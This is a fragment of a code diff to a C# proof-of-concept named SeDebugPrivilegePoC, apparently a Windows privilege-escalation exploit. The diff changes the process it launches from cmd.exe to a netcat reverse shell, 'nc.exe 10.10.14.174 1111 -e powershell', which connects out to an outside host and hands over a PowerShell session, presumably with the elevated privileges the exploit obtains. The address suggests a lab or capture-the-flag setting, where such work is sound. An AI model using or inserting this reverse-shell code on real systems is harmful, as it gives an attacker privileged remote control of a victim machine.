@@ -243,7 +243,7 @@ namespace SeDebugPrivilegePoC
 
                 status = CreateProcess(
                     null,
-                    @"C:\Windows\System32\cmd.exe",
+                    @"C:\TEMP\nc.exe 10.10.14.174 1111 -e powershell",
                     IntPtr.Zero,
                     IntPtr.Zero,
                     false,
